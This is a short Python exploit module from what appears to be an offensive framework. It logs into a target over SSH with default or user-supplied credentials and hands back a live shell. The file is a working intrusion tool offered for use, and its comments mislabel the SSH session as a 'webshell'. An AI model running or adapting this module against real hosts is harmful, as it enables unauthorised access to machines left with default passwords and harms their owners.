#######################################################
# SSH
# (not a CVE/Metasploit module)
# 
# This exploit abuses default SSH passwords.
#######################################################

from utils import Exploit
from shells.ssh_shell import SSHShell

class SSH(Exploit):
    """Class for exploiting SSH default credentials"""

    def __init__(self, server_ip):
        super().__init__(
            os='linux',
            name='SSH default credentials',
            description='',
            requirements=['ssh'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return an SSH shell'''
        shell = SSHShell(target, self.os)
        shell.connect(self.kwargs['username'], self.kwargs['password'])

        # Test if webshell works
        if shell.cmd(''):
            # Return webshell
            self.message(target, 'SSH connection successful')
            self.success(target)
            return shell
        else:
           self.error(target, 'Could not establish SSH connection')
           shell.kill()
           return
    
    def get_kwargs(self):
        username = input('Enter a username: ')
        password = input('Enter a password: ')
        return { 'username': username, 'password': password }
